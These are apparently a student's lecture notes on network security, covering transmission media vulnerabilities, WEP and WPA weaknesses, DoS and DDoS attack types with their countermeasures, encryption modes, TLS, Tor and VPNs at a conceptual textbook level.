
## **Lecture Notes: Security in Computing - Chapter 6: Networks**


### **I. Introduction to Network Security**

A.  **Core Concept:** Networks connect computers but also introduce vulnerabilities that attackers can exploit. Security aims to protect data and resources during transmission and access.


B.  **Network Transmission Media & Vulnerabilities**
    *   Purpose: Understand that different physical media have inherent properties affecting their security.
    *   Types of Media:
        *   **Cable (Wire):**
            *   *Strengths:* Widely used, inexpensive.
            *   *Weaknesses:* Susceptible to **emanation** (signals leaking), physical **wiretapping**, inductance-based eavesdropping (Slide 166). Copper cable tapping requires physical access but can be done via inductance or splicing .
        *   **Optical Fiber:**
            *   *Strengths:* Immune to emanation, difficult to tap without detection.
            *   *Weaknesses:* Vulnerable at connection points, splicing causes detectable signal loss, bending might allow tapping (Slide 166). Fiber tapping often requires specialized equipment 
        *   **Microwave:**
            *   *Strengths:* Strong signal (less affected by weather).
            *   *Weaknesses:* Exposed transmission path, requires line of sight, signal repeats needed for distance, signal spreads making interception possible near receiver .
        *   **WiFi (Wireless Radio):**
            *   *Strengths:* Widely available, built into many devices.
            *   *Weaknesses:* Signal degrades over distance (short range), easily **intercepted** (broadcast nature), susceptible to jamming, interference .
        *   **Satellite Communication:**
            *   *Strengths:* Strong, fast signal.
            *   *Weaknesses:* Delay due to distance, signal spreads over wide area at receiving end (vulnerable to eavesdropping near receiver .
    *   Common Attack Vectors :
        *   **Wiretaps:** Directly accessing the physical medium.
        *   **Sniffers:** Capturing data packets traversing the network (passive).
        *   **Rogue Receivers:** Unauthorized devices listening to transmissions (especially wireless).
        *   **Interception:** Capturing data in transit.
        *   **Impersonation/Spoofing:** Masquerading as a legitimate user or device.
        *   [*Visual Cue:* Diagram shows potential interception points: wiretap on LAN, microwave interception, rogue receiver on WAN, impersonation.]

C.  **The OSI Model & Network Threats**
    *   OSI Model Layers: Provides a framework for understanding network functions.
        1.  Physical
        2.  Data Link
        3.  Network
        4.  Transport
        5.  Session
        6.  Presentation
        7.  Application
  ![[Pasted image 20250429010019.png]]
        *   *Connection:* Different attacks target different layers (e.g., wiretapping at Physical, DoS at Network/Transport, Application-level attacks at Application).
    *   Fundamental Threats to Network Communications:
        *   **Interception (Confidentiality Attack):** Unauthorized viewing/listening (e.g., eavesdropping, sniffing).
        *   **Modification (Integrity Attack):** Unauthorized changing of data in transit.
        *   **Fabrication (Integrity/Authenticity Attack):** Unauthorized creation of data/packets (e.g., spoofing).
        *   **Interruption (Availability Attack):** Preventing authorized access (e.g., DoS, cutting cables).
    *   *Memory Aid (Threats):* **I** **M**ean **F**or **I**nterruption (Interception, Modification, Fabrication, Interruption).

D.  **Security Perimeters**
    *   **Definition:** A boundary around a controlled network area (e.g., home network, corporate LAN).
    *   Inside the Perimeter: Generally higher trust, physical controls often protect cables/devices.
    *   Between Perimeters: Connections are necessary for usefulness (e.g., internet access) but expose systems to uncontrolled elements.
    *   **Key Control:** **Encryption** is essential for protecting data traversing untrusted networks between perimeters.


---

### **II. Network Vulnerabilities & Attack Surfaces**

A.  **Why Networks are Vulnerable to Interception**
    *   **Anonymity:** Attackers can launch attacks from afar, hiding their identity. (Relates to spoofing).
    *   **Many Points of Attack:** Large networks have numerous potential entry points (devices, connections). Attack can come from any host.
    *   **Sharing:** Networked systems inherently share resources and access, increasing potential exposure compared to standalone computers. (Attackers can leverage compromised machines).
    *   **System Complexity:** Managing and securing diverse systems (OSs, hardware, software) across a network is inherently difficult.
    *   **Unknown Perimeter (Slide 7):** Dynamic networks make it hard to know exactly which systems belong and if any are compromised or acting as unauthorized bridges.
         ![[Pasted image 20250429010046.png]]
    *   **Unknown Path (Slide 7):** Data may traverse many paths, some potentially untrustworthy, between source and destination.
        ![[Pasted image 20250429010057.png]]

B.  **Defining the Network Perimeter**
    *   Components forming the secured boundary:
        *   **Border Routers:** Direct traffic in/out; the last controlled router before the untrusted network (e.g., Internet).
        *   **Firewalls:** Filter traffic based on defined rules (allow/deny). Often placed behind border routers for deeper inspection.
        *   **Intrusion Detection System (IDS):** Monitors network for suspicious activity and alerts administrators (alarm system).
        *   **Intrusion Prevention System (IPS):** An **active** IDS that can automatically block or mitigate detected threats.
        *   **De-Militarized Zones (DMZ) / Screened Subnets:** Small, isolated networks for public-facing services (e.g., web servers), protected by firewalls, limiting exposure of the internal network. (Covered in more detail later - Slide 97).

C.  **Sources of Data Corruption (Modification/Fabrication)**
    *   Data corruption can stem from various sources, not just malicious attacks.
    *   Sources:
        *   Typing errors (Human)
        *   Malicious code (Software)
        *   Hardware failure
        *   Noise/Accidents (Environmental/Physical)
        *   Program errors (Software)
        *   Software flaws (Bugs/Vulnerabilities)
        *   Transmission problems (Network Issues)
        *   Hacker activity (Malicious)
        *   Human mistake (Operational)
    *   Types of Data Corruption Attacks (Listed on side):
        1.  Sequencing: Altering the order of data.
        2.  Substitution: Replacing data.
        3.  Insertion: Adding spurious data.
        4.  Replay: Re-sending captured data.
    ![[Pasted image 20250429010132.png]]

D.  **Simple Replay Attack**
    *   **Mechanism:**
        1.  Attacker intercepts legitimate communication (e.g., login with ID and encrypted password).
        2.  Attacker later *replays* the captured (still encrypted) password transmission to the server.
        3.  Server may accept it as valid if no countermeasures are in place.
    ![[Pasted image 20250429010141.png]]
    *   **Countermeasures:** Require techniques like sequence numbers, timestamps, or challenge-response protocols (not detailed here, but implied by the note about tools/protocols/crypto).

E.  **Interruption: Loss of Service / Denial of Service (DoS)**
    *   Causes of Service Loss:
        *   **Routing Issues:** Protocol complexity means misconfigurations can "poison" routing tables, making resources unreachable.
        *   **Excessive Demand:** Attackers intentionally overwhelm network capacity or server resources (finite limits). **Goal**: overload capacity or reduce ability to serve legitimate users.
        *   **Component Failure:** Hardware/software failures can be sporadic and cause outages if redundancy/planning is inadequate.
    *   *Connection:* This introduces DoS, which is explored in detail later.

F.  **Port Scanning (Slide 11)**
    *   **Definition:** A **reconnaissance** technique used to probe a target host/network to discover open ports, and often the services/versions running on them.
    *   Purpose: Identify potential vulnerabilities associated with specific services/versions.
    *   Not strictly an attack, but a precursor.
    *   Information Gathered: Port number, protocol (TCP/UDP), state (open, closed, filtered), service name, product/version (if available).
    *   ![[Pasted image 20250429010208.png]]
    *   *Real-World Example:* `nmap` is a common tool used by both attackers and security professionals (for vulnerability assessment).

---

### **III. Wireless Network Security (WiFi)**

A.  **Specific Vulnerabilities in Wireless Networks**
    *   **Confidentiality:** WiFi is broadcast; unencrypted messages can be read by anyone in range.
    *   **Integrity:** Access Points (APs) often accept the strongest signal for a given client MAC address. Attackers can spoof legitimate clients and boost signal to hijack sessions.When WiFi access points receive two streams of communication claiming to be the same computer, they necessarily accept the one with greater signal strength. This allows attackers to take over and forge sessions by spoofing legitimate computers and boosting signal strength.
    *   **Availability:** 
        * In addition to the obvious availability issues, WiFi creates new availability problems, such as session hijacking, forced disassociation, and jamming.  
        * Standard issues (jamming, interference).
        *   New issues: Session hijacking, forced disassociation (deauthentication attacks), jamming specific channels.
    *   **Unauthorized Access:** Need cryptographic controls (like WPA2) to prevent unauthorized connections.
    *   ***Picking up the Beacon:** Even if SSIDs are "hidden" (not broadcast in beacons), they can be discovered by monitoring client probe requests.
    *   ***SSID in all Frames:** Similar to picking up the beacon, once a client connects to an access point, the SSID is stored in all communication frames and can be sniffed that way
    *   ***Association Issues:** Clients often auto-connect to known/trusted SSIDs (e.g., `AT&Twifi`, `Airport Free Wifi`). Attackers create **rogue access points** with common SSIDs to trick devices into connecting (**Evil Twin** attack). (Slide 171 also mentions Evil Twin).

B.  **Failed Countermeasure: WEP (Wired Equivalent Privacy)**
    *   **Goal:** Intended to provide WiFi security equivalent to a wired network (original 802.11 standard).
    *   **History:** Introduced with 802.11, weaknesses identified by 2001, easily crackable within minutes soon after.
    *   **How it (was supposed to) Work**
        1.  Client and AP share a **pre-shared key (PSK)**.
        2.  AP sends a random number (challenge).
        3.  Client encrypts challenge with PSK and returns it.
        4.  AP decrypts, verifies challenge, authenticates client.
        5.  Subsequent communication encrypted with the PSK.
    *   **Why WEP Failed (Critical Weaknesses):**
        *   **Weakness in Encryption Algorithm:** Uses **RC4 stream cipher** with a **static key**. The *implementation* (how RC4 was used) was flawed.WEP uses the RC4 stream cipher for encryption, which encrypts data with a static key. However, the way WEP uses this cipher is flawed, making it vulnerable to various attacks.
        *   **Short Key Length:** Used 64-bit or 128-bit keys, but 24 bits were for the **Initialization Vector (IV)**, reducing effective key size to **40 or 104 bits**. Keys were often weak (typed phrases), vulnerable to dictionary attacks.
        *   **Predictable Initialization Vectors (IVs):** Used a **small 24-bit IV**. Due to the "birthday problem," IVs repeat frequently, creating patterns in ciphertext that allow key recovery (related key attacks).WEP uses a small, 24-bit Initialization Vector (IV) to initialize the encryption process. Due to the limited size of the IV, it repeats frequently, leading to patterns that attackers can exploit to crack the encryption.
        *   **Weaknesses in Key Scheduling Algorithm:** Vulnerable to statistical attacks (e.g., FMS attack) allowing key deduction from observed packets.: WEP's key scheduling algorithm is vulnerable to statistical attacks, allowing attackers to deduce the key from observing enough encrypted packets
        *   **Packet Injection and Replay Attacks:** No protection against capturing and re-transmitting encrypted packets or injecting new ones.WEP does not provide protection against packet injection and replay attacks. Attackers can capture and re-transmit encrypted packets, potentially gaining access to the network.
        *   **Lack of Authentication Mechanism:** Client authentication was weak; based only on knowing the shared key. No robust per-user or per-device authentication. Any client knowing SSID & MAC address was assumed legitimate.: WEP lacks a robust mechanism for client authentication, making it susceptible to unauthorized access by attackers.
        *   **Ineffective Key Management:** Relied on **manual, static key distribution**. Keys rarely changed, increasing risk if compromised.
        *   **Faulty Integrity Check:** Used CRC-32 checksum (for error detection), not a cryptographic hash (Message Integrity Code - MIC), making it possible to modify packets undetected.

C.  **Stronger Protocol: WPA/WPA2 (WiFi Protected Access)**
    *   **History:** WPA designed in 2003 as interim replacement for WEP. WPA2 (using AES) followed in 2004, still the standard (though WPA3 exists now).
    *   **Key Improvements over WEP:**
        *   **Non-Static / Dynamic Keys (TKIP/AES):**
            *   WPA initially used **TKIP (Temporal Key Integrity Protocol)** as a wrapper around RC4 to fix WEP flaws without requiring new hardware.
            *   **WPA2 mandates AES (Advanced Encryption Standard)**, a much stronger block cipher. **(Recommended configuration: AES, disable TKIP).**
            *   Uses a **hierarchy of keys**; generates fresh **session keys** for confidentiality/integrity for each session, keys changed **per-packet (TKIP)** or per-session using robust methods (AES). Master keys protected.
        *   **Stronger Authentication:**
            *   **WPA-PSK (Personal):** Uses a passphrase (should be long and random) to generate keys. Still vulnerable if passphrase is weak.
            *   **WPA-Enterprise:** Uses **802.1X/EAP** with a central **RADIUS server** for individual user authentication (username/password, certificates, tokens). Much more secure for organizations.
        *   **Integrity Protection:** Includes a **cryptographic Message Integrity Check (MIC)** called "Michael" (in TKIP) or uses AES-CCMP (in WPA2) to prevent tampering. WPA MIC uses a 64-bit check.
        *   **Session Initiation:** Uses a **four-way handshake** to authenticate and establish unique encryption/integrity keys for the session.
    *   **Security Status:** WPA2 (with AES and a strong passphrase/Enterprise auth) is considered adequately secure. Attacks exist but are often limited or rely on weak passwords.

D.  **WEP vs WPA Comparison Summary (Slides 22-24)**
    *   **Encryption Strength:** WEP (RC4 - weak/broken) vs. WPA (TKIP - better) / WPA2 (AES - strong).
    *   **Authentication:** WEP (Simple PSK - weak) vs. WPA/WPA2 (PSK - better, Enterprise/802.1X - strong).
    *   **Key Management:** WEP (Manual, static - ineffective) vs. WPA/WPA2 (Dynamic, key refreshing - robust).
    *   **Security Features:** WEP (Lacks integrity - vulnerable) vs. WPA/WPA2 (Adds MIC, handshake - more secure).
    *   **Overall:** WEP is **obsolete and insecure**. WPA/WPA2 is the **preferred standard**.

---

### **IV. Denial of Service (DoS) and Distributed DoS (DDoS) Attacks**

A.  **Definitions 
    *   **Denial of Service (DoS):** An attack aiming to make a system or network **unavailable** to legitimate users by disrupting normal services. 
    *   **Distributed Denial of Service (DDoS):** A DoS attack originating from **multiple compromised systems** (often **bots**/**zombies** in a **botnet**) simultaneously flooding a target. Amplifies the effect of DoS. 
    *   **DoS vs DDoS :** DDoS is a *type* of DoS. DoS can *also* refer to an attack from a single source. Both definitions are used. DoS encompasses various attack types.

B.  **How DDoS Works (Slides 28, 29, 30)**
    1.  **Compromise Computers:** Attackers infect numerous machines with malware (exploiting vulnerabilities) to create **bots** or **zombies**. These form a **botnet**.The attackers first compromise a large number of computers or devices by infecting them with malware or by exploiting vulnerabilities. 
    2.  **Command and Control (C&C):** Bots connect to a C&C server controlled by the attacker (**Botmaster**). (Slide 28) 
       The attackers use this control to orchestrate the attack.![[Pasted image 20250429012041.png]]
    3.  **Initiate Attack:** Once the botnet (network of compromised devices) is established and under the attackers' control, they initiate the DDoS attack by instructing the compromised devices to send a flood of traffic to the target system or network
    4.  **Flood Target:** All bots simultaneously send a flood of traffic/requests to the target system/network. (Slides 28, 30)
    5.  **Overwhelm Target:** The target system or network becomes overwhelmed by the flood of incoming traffic, which consumes its resources such as bandwidth, processing power, or memory.
        Botnets often undetected on host machines; multi-layer C&C makes tracing attacker hard; redundancy in C&C.
    
![[Pasted image 20250429012223.png]]
C.  **Example: DYNDNS Attack 
    *   Exploited **WiFi cameras** with **default passwords** to create a massive botnet (Mirai botnet variant).
    *   Used this botnet to launch DDoS attacks against Dyn (a major DNS provider), causing widespread internet outages.
    *   *Real-World Relevance:* Highlights the danger of insecure IoT devices.

D.  **Common Types of DDoS Attacks (Slides 27, 32, 136-138)**
    *   Classification: Volumetric, Protocol, Application Layer, Reflected, Stealthy.
   1. Volumetric Attacks (Slides 27, 37, 136):
        *   **Goal:** Clog the network pipe with sheer volume of traffic. Measured in Bits/Packets per second.
        *   **Mechanism:** Use botnets to generate massive traffic floods.
        *   **Examples:**
            *   UDP Flood (Slide 136)
            *   ICMP Flood (Ping Flood) (Slide 39)
            *   **Amplification Attacks:** Exploit protocols to make servers send large replies to a spoofed victim IP. (e.g., **DNS Amplification**, NTP Amplification, SNMP Reflection). 
        * ![[Pasted image 20250429012640.png]]

   2. Protocol Attacks (State-Exhaustion Attacks) (Slides 27, 35, 136):
        *   **Goal:** Consume resources on network equipment (firewalls, load balancers) or servers by exploiting stateful protocols.
        *   **Mechanism:** Send packets that misuse protocol operations.
        *   **Example: SYN Flood 
            *   Exploits the **TCP 3-way handshake** (SYN, SYN-ACK, ACK).
            *   Attacker sends many **SYN packets** (request to connect) with **spoofed source IP addresses**.
            *   Server replies with **SYN-ACK** to the fake IPs and waits for the final ACK (which never arrives).
            *   Server's **connection queue (listen queue/backlog)** fills up, preventing legitimate connections.
          ![[Pasted image 20250429012600.png]]
        *   Other examples: Ping of Death (malformed ICMP - Slide 179), Teardrop.

   3. Application Layer Attacks 
        *   **Goal:** Overwhelm specific application resources (web server, database). Harder to detect as requests can look legitimate.
        *   **Mechanism:** Flood application with seemingly valid but resource-intensive requests. If the target gets several million of those requests in a short time, it can very quickly get overwhelmed and either slowed to a crawl or locked up completely.
        *   **Examples:**
            *   **HTTP Flood:** Bots send high rate of valid HTTP GET/POST requests.
             ![[Pasted image 20250429012324.png]]
            *   **Slowloris / Slow Read:** Attackers establish many connections and keep them open by sending partial requests or reading responses very slowly, exhausting server connection limits. 
            ![[Pasted image 20250429013431.png]]
            *   Attacks targeting login pages, search functions, APIs.

E.  **Specific DoS Attack Examples:**
    *   **Ping Flood (ICMP Flood) :**
        *   Overwhelms target with ICMP Echo Request (ping) packets.
        *   Requires knowing target IP.
        *   Can cause network congestion.
        *   Types: Targeted Local (known local IP), Router disclosed (known router IP), Blind Ping (use external tool to find IP first).
        ![[Pasted image 20250429012734.png]]
    *   **Smurf Attack**
        *   A type of **reflected, amplification DoS attack**.
        *   **Mechanism:**
            1.  Attacker sends ICMP Echo Requests to a network's **broadcast address** (e.g., X.X.X.255).
            2.  The **source IP address is spoofed** to be the victim's IP.
            3.  All hosts on the broadcast network reply to the victim with ICMP Echo Replies.
            4.  Amplifies the attack by the number of hosts on the broadcast network.
        *   *Defense:* Modern networks usually disable responding to broadcast pings or relaying directed broadcasts.
        ![[Pasted image 20250429012815.png]]
    *   **Teardrop Attack** 
        *   Exploits **IP fragmentation**.
        *   Attacker sends **fragmented IP packets** with overlapping, conflicting offset information.
        *   Target OS tries to reassemble fragments and may crash or lock up due to the conflicting instructions.
    *   **DNS Spoofing / Cache Poisoning :**
        *   Attacker provides false DNS information (e.g., acts as a fake DNS server or corrupts a real one).
        *   Redirects users trying to reach a legitimate site (e.g., `www.microsoft.com`) to a malicious site.
        *   Can be used for phishing, malware distribution, or DoS (by routing to non-existent hosts).
        ![[Pasted image 20250429012947.png]]
    *   **Rerouting Routing / Route Poisoning (Slide 46, 181):**
        *   Attackers (or misconfigured routers) advertise incorrect routing information (e.g., claiming a low-cost path to a destination).
        *   Legitimate traffic gets sent to the wrong place (e.g., a "black hole" where it's dropped, or to an eavesdropper).
        *   Relies on trust in routing protocol updates.
        ![[Pasted image 20250429013006.png]]
        Diagram shows router C advertising routes; if malicious, it could disrupt traffic.
    *   **Session Hijacking (TCP Session Hijacking) :**
        *   Attacker takes over an established TCP session between two parties.
        *   Often involves predicting or sniffing TCP sequence numbers.
        *   Attacker can inject malicious commands or steal data.
        *   The image shows the attacker synchronizing with the receiver while sending a Reset (RST) packet to the original sender, making the sender think the connection dropped.
        ![[Pasted image 20250429013056.png]]

F.  **Countermeasures to DoS/DDoS Attacks
    *   **Network Firewalls :** Filter known malicious IPs, suspicious characteristics, rate-limit connections. filter incoming traffic and block packets that appear to be part of an attack, such as those coming from known malicious IP addresses or with suspicious characteristics. (More on Firewalls later).
    *   **Intrusion Detection/Prevention Systems (IDS/IPS) :** Detect known attack patterns or anomalies, block or alert. They can automatically block or alert administrators about potential DoS attacks in real-time. (More on IDS later).
    *   **Traffic Filtering and Rate Limiting:** Set bandwidth limits, filter specific traffic types, use algorithms to control packet flow. Implementing traffic filtering and rate limiting mechanisms can help mitigate the impact of DoS attacks by limiting the amount of incoming traffic to a manageable level. involves setting bandwidth limits, filtering out certain types of traffic, or using rate-limiting algorithms to control the flow of packets.
    *   **Load Balancers :** Distribute traffic across multiple servers, preventing single point of failure/overload. Load balancers distribute incoming traffic across multiple servers or network devices, ensuring that no single device becomes overwhelmed. This can help prevent a single point of failure and mitigate the impact of DoS attacks by spreading the load.
    *   **Content Delivery Networks (CDNs):** Distribute content geographically, absorbing traffic surges closer to the source, mitigating impact on origin servers. CDNs cache and distribute content across geographically distributed servers, which can help absorb and mitigate the impact of DoS attacks by distributing traffic across multiple points of presence.
    *   **DDoS Mitigation Services :** Specialized third-party services ("scrubbing centers") that detect and filter malicious traffic before it reaches the target network. Often cloud-based. These services often employ a combination of network monitoring, traffic analysis, and filtering techniques to block malicious traffic before it reaches the target network.
    *   **Scalable Architecture :** Design systems that can dynamically scale resources (bandwidth, compute) during traffic spikes. These services often employ a combination of network monitoring, traffic analysis, and filtering techniques to block malicious traffic before it reaches the target network.
    *   **Incident Response Plans:** Pre-defined procedures for identifying, mitigating, recovering from, and communicating about DoS attacks.
    *   **Regular Security Audits and Updates :** Patch systems to fix vulnerabilities exploited by DoS attacks. Maintain secure configurations.
    *   **User Authentication and Access Control :** Prevent unauthorized internal users from launching attacks or gaining access to targetable resources.
    *   **OS-Level Protections (Linux Example - Slide 140):**
        *   **Reverse Path Filtering:** Helps prevent IP spoofing by checking if return path for source IP is valid.
        *   **SYN Cookies:** Avoids filling connection queue during SYN floods by encoding connection info into the SYN-ACK sequence number, only allocating state upon receiving a valid final ACK.
        ![[Pasted image 20250429013332.png]]
        *   **Session Caching:** Speeds up re-establishment of recent TCP sessions.

---

### **V. Network Security Essentials & Controls**

A.  **Overview of Essentials**
    1.  Encryption
    2.  Cryptographic Protocols
    3.  Secure Routing Approaches
    4.  VPN (Virtual Private Networks)
    5.  Firewall
    6.  DMZs (De-Militarized Zones)

B.  **1. Encryption (Slides 52-62)**
    *   **a) Link-to-Link Encryption (Slides 52-55):**
        *   **Concept:** Data encrypted just before physical transmission (OSI Layer 1) and decrypted upon arrival at the *next* hop.
        *   **Process:** Each link (hop) encrypts/decrypts independently. Intermediate nodes **decrypt** the data to read headers and re-encrypt for the next link.
        *   **Use Case:** Securing the transmission medium itself when it's most vulnerable (e.g., wireless links, satellite). Protects against physical taps on that specific link.
        *   **Vulnerability:** Data is **plaintext** at intermediate nodes (routers, switches).
         ![[Pasted image 20250429013502.png]]
        *   **Applications :** 
                • **Fiber optics**, 
                •  **Ethernet** (LAN/WAN switches/routers) - protect data as it travels between network devices, such as switches, routers, and servers. helps prevent eavesdropping and unauthorized access to network traffic within the LAN and WAN, 
                •  **Satellite links**, - used to secure data transmission between ground stations and satellites or between satellites. • protects sensitive information transmitted over the satellite links from interception or jamming by adversaries.
                •  **Wireless (WiFi, cellular)** - Used in Wi-Fi, cellular, and microwave links. • enhances the security of wireless transmissions and helps mitigate risks such as eavesdropping, man-in-the-middle attacks, and signal interception.
                •  **Industrial Control Systems (ICS)** - secures communication between control systems, sensors, actuators, and other devices. • protects industrial networks from cyber threats and ensures the integrity and confidentiality of data exchanged within the system.
                •  **Military/Defense networks** - protects classified and sensitive information transmitted over communication links, including terrestrial, aerial, and maritime networks.
                •  **Undersea cables**. - secures data transmission over undersea communication cables used for international telecommunications and internet connectivity. • helps safeguard submarine cable systems from interception, tapping, and sabotage.
    *   **b) End-to-End Encryption:**
        *   **Concept:** Data encrypted at the source application (or high OSI layer) and only decrypted by the final destination application.
        *   **Process:** Intermediate nodes (routers, etc.) **cannot decrypt** the payload data; they only process headers for routing.
        *   **Use Case:** Sending sensitive data across untrustworthy networks (like the Internet) where intermediate nodes should not see the content. Protects data content from intermediate hops.
        *   **Real-World Note:** Often implemented using protocols like SSL/TLS, may not encrypt *all the way* to Layer 7, but ensures intermediate nodes can't decrypt.
        ![[Pasted image 20250429013857.png]]
        *   **Applications (Slides 58-61):**
            *   **Messaging Apps:** 
                • **Signal** - Signal is a messaging app known for its strong focus on privacy and security. It uses end-to-end encryption for all messages, voice calls, and video calls, ensuring that only the intended recipients can access the content.
                • **WhatsApp** - WhatsApp, owned by Facebook, implements end-to-end encryption for its messages, calls, photos, and videos. This means that only the sender and receiver can decrypt and read the messages, providing a high level of privacy.
                • **Telegram (Secret Chats)**. - : Telegram offers a feature called "Secret Chats" which uses end-to-end encryption. Messages sent in Secret Chats can only be accessed on the devices of the sender and the recipient, and they are not stored on Telegram's servers.
            *   **Email Services:** 
                • **ProtonMail** - ProtonMail is an email service that provides end-to-end encryption for emails. Messages sent between ProtonMail users are encrypted on the sender's device and can only be decrypted by the recipient
                • **Tutanota**. - Tutanota is another email provider that offers end-to-end encryption. It encrypts emails and contacts automatically, ensuring that only the sender and receiver can access the content.
            *   **File Storage/Sharing:** 
                • **MEGA**- MEGA is a cloud storage service that offers end-to-end encryption for files stored on its servers. Users can upload files securely and share them with others while ensuring that only authorized users can decrypt and access the files.
                • **Sync.com**. - : Sync.com is another cloud storage provider that utilizes end-to-end encryption for file storage and sharing. It ensures that files are encrypted on the user's device before being uploaded to the cloud, preventing unauthorized access.
            *   **Collaboration Platforms:** 
                • **Keybase**. - : Keybase offers end-to-end encrypted messaging, file sharing, and collaboration tools. It allows users to securely communicate and share files with others while ensuring that the content remains private and secure.
            *   **Voice/Video Calling:** 
                • **Apple FaceTime**, - FaceTime, Apple's video and voice calling service, uses end-to-end encryption for communication between Apple devices. This ensures that calls remain private and cannot be intercepted by third parties.
                • **Signal**, - In addition to messaging, Signal also offers end-to-end encryption for voice and video calls, providing users with a secure way to communicate in real-time.
                • **Skype (Private Conversations)**, - : Skype offers a feature called "Private Conversations" that utilizes end-to-end encryption for voice calls, video calls, and text messages. This ensures that only the participants can access the content of their conversations.
                • **Zoom (E2EE option)**, - Zoom introduced end-to-end encryption for its meetings, ensuring that only the meeting participants can access the audio, video, and shared content. This feature provides an added layer of security for sensitive discussions.
                • Microsoft Teams (optional E2EE).
    *   **c) Link vs. End-to-End Comparison (Slide 62):**
        ![[Pasted image 20250429014227.png]]
            *   *Security within Hosts:* Link exposes data partially; End-to-End protects it.
            *   *Security at Intermediate Nodes:* Link exposes data; End-to-End protects it.
            *   *Applied By:* Link (Sending Host/Device); End-to-End (User Application).
            *   *User Visibility:* Link (Invisible); End-to-End (User application encrypts).
            *   *Control:* Link (Admin selects); End-to-End (User selects/Application handles).
            *   *Granularity:* Link (All or no data); End-to-End (User can selectively encrypt).
            *   *Implementation:* Link (Software/Hardware); End-to-End (Usually software, sometimes hardware assist).
            *   *Keys:* Link (One key per pair of hosts/nodes); End-to-End (One key per pair of users/applications).
            *   *Authentication:* Link (Node auth); End-to-End (User auth).
        *   **Key Takeaway:** Choose based on what needs protection: the *link* itself (Link) or the *data content* across multiple links (End-to-End). They can be used together.

C.  **2. Cryptographic Protocols**
    *   Protocols designed to provide secure communication channels.
    *   Examples: SSL/TLS, IPSec, SSH.
    *   **a) SSL/TLS (Secure Sockets Layer / Transport Layer Security) (Slides 64-68):**
        *   **History:** SSL designed in 1990s (Netscape). TLS is the modern, more secure successor (renamed in 1999). **TLS should be used.** (Often still called SSL colloquially).
        *   **Layer:** Operates at OSI Layer 4 (Transport). Secures application protocols running above it (like HTTP -> HTTPS).
        *   **Provides:**
            *   **Server Authentication:** Client verifies server's identity (usually via certificates).
            *   **Client Authentication (Optional):** Server verifies client's identity.
            *   **Encrypted Communication:** Confidentiality and Integrity for data exchange.
        *   **Cipher Suite Negotiation (Slide 65):**
            *   At session start, client and server negotiate algorithms for:
                1.  **Authentication:** (e.g., RSA, ECDSA for digital signatures).
                2.  **Confidentiality:** (e.g., AES, ChaCha20 for encryption).
                3.  **Integrity:** (e.g., SHA-256, Poly1305 for hashing/MAC).
            *   Server offers list -> Client chooses one it supports.
        *   **Vulnerability :** Servers configured to offer many cipher suites (for compatibility) might include **weak/broken ones**. A **Man-in-the-Middle (MitM)** attacker could potentially force a downgrade to a weak suite they can break (**Downgrade Attack**).
        * 
              ![[Pasted image 20250429014334.png]] 
             Shows a table listing various TLS cipher suite identifiers and the algorithms they use (some secure, some insecure like those using MD5 or short keys).*
        *   **SSL/TLS Certificates :**
            *   Used for authentication (primarily server-side).
            *   Contains: Domain name, owner info, **public key**, issuer (Certificate Authority - CA), validity dates, digital signature of CA.
            *   **Chain of Trust:** Certificates are signed by CAs. Browsers/OSs have a list of trusted Root CAs. A certificate is trusted if it's signed by a trusted CA or an intermediate CA whose certificate chains back to a trusted Root CA.
            *   *Visual Cue (Slide 67):* Shows example SSL certificate details and the certificate chain (e.g., GTE CyberTrust Global Root -> DigiCert High Assurance CA -> login.yahoo.com).*
        *   **Applications using TLS (Slide 68):** Web Browsing (HTTPS), Email (secure variants like SMTPS, IMAPS, POP3S), Instant Messaging, File Transfer (FTPS), VPNs (OpenVPN often uses TLS), VoIP, Secure APIs, Secure IoT communication.
    *   **b) IPSec (Internet Protocol Security) (Slide 69):**
        *   Operates at OSI Layer 3 (Network).
        *   Provides security for *all* IP traffic (TCP, UDP, ICMP, etc.).
        *   Commonly used for VPNs.
        *   Provides Authentication (AH), Confidentiality (ESP), Integrity (ESP), Anti-Replay.
        *   🚩 *Reading Assignment: Details not covered in slides.*
    *   **c) SSH (Secure Shell) (Slide 69):**
        *   Application layer protocol.
        *   Provides secure remote login, command execution, and tunneling capabilities.
        *   Replaced insecure protocols like Telnet and rlogin.
        *   Uses encryption and authentication.
        *   🚩 *Reading Assignment: Details not covered in slides.*

D.  **3. Secure Routing & Traffic Protection**
    *   Techniques to enhance anonymity and confidentiality beyond basic encryption.
    *   **a) Onion Routing (e.g., Tor) :**
        *   **Concept:** Anonymizes communication by routing traffic through a volunteer overlay network.
        *   **Mechanism :**
            1.  **Encryption Layers:** Data is wrapped in multiple layers of encryption, like an onion. Each layer corresponds to a relay node in the Tor circuit. Uses asymmetric crypto initially to set up symmetric keys for each hop.
            2.  **Routing:** Packet sent through a series of randomly selected Tor relays (onion routers).
            3.  **Decryption:** Each relay decrypts (peels off) one layer of encryption to find the address of the next relay.
            4.  **Anonymity:** No single relay knows *both* the original source and final destination. The entry node knows the source but not destination; exit node knows destination but not source; intermediate nodes know neither.
        *   **Goal:** Prevent eavesdroppers (and relays themselves) from learning source, destination, or content by linking them together (**Traffic Analysis**). 
        *   **Use Cases :** Anonymous web browsing (Tor Browser), secure messaging, circumventing censorship. Helpful for users in oppressive regimes .
        *   **Drawbacks :** Can introduce latency/performance overhead due to multiple hops and encryption layers. Exit nodes can see unencrypted traffic if the destination protocol isn't encrypted (e.g., plain HTTP).
        ![[Pasted image 20250429014517.png]]Series of diagrams illustrating how Tor works: connection setup (directory lookup), establishing a circuit, handling timeouts/node changes, and multiple users/circuits.*
    *   **b) Traffic Padding :**
        *   **Concept:** Adding extra, meaningless data (padding) to network packets.
        *   **Goal:** Obfuscate the *true* size and timing of messages, making **traffic analysis** harder. Conceals patterns and volume.
        *   **Mechanism:** Makes packets appear larger or more uniform in size/frequency.
        *   **Use Case:** Often used in anonymity networks (like Tor) to further hide user activity patterns.

E.  **4. Virtual Private Networks (VPN) 
    *   **Concept:** Creates a **secure, encrypted tunnel** over a public network (like the Internet), allowing private network communication between sites or remote users. (Slides 75, 146)
    *   **Goal:** Provide **confidentiality** and **integrity** for data traversing untrusted networks. Makes remote connections appear as if they are on the local private network. (Slide 75)
    *   **Mechanism:** Uses cryptographic protocols (like **IPSec**, SSL/TLS) to encrypt traffic between VPN client/gateway and VPN server/gateway. Often terminated by firewalls. (Slides 75, 146)
    ![[Pasted image 20250429014609.png]] 
    Diagram showing Office A connected to Office B via an encrypted tunnel over the Internet, terminated by firewalls.*
    ![[Pasted image 20250429014618.png]] 
    Diagram showing a teleworker connecting via VPN to the office firewall, gaining access to internal resources.
